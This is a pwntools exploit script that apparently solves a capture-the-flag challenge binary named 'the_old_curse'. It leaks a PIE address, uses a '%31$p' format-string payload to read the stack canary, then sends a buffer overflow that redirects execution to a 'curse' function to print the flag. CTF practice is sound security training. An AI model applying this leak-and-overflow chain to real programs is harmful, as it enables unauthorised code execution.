from pwn import *
import re

from colorama import Fore, Style
import sys

def debug_message(message: str):
    print(f"{Fore.RED}  {message} {Style.RESET_ALL}")



process_object = process("./the_old_curse")
elf_object = ELF("./the_old_curse", checksec=False)

# Extract the leak
raw_output = process_object.recv().decode()
help_address = re.search(r"0x[a-f0-9]{1,8}", raw_output)[0]
debug_message(f"[+]Help address is {help_address}")

# Compute pie base
pie_base = int(help_address, 16) - elf_object.symbols["help"]
debug_message(f"[+]PIE base is {hex(pie_base)}")

# Compute curse address
curse_address = pie_base + elf_object.symbols["curse"]
debug_message(f"[+]Curse address is {hex(curse_address)}")

# Send format string payload
format_string_payload = b"%31$p"
process_object.sendline(format_string_payload)

# Extract canary
raw_output = process_object.recv().decode()
canary = re.search(r"0x[a-f0-9]{1,8}", raw_output)[0]
debug_message(f"[+]Canary is {canary}")

# Send input
payload = 64 * b'A' + p32(int(canary, 16)) + 12 * b'B' + p32(curse_address)
process_object.sendline(payload)

# Get the flag if everything is ok
curse_output = process_object.recv().decode()
flag = re.search(r"CTF\{[0-9a-f]{64}\}", curse_output)[0]
debug_message(f"[+]Flag is {flag}")

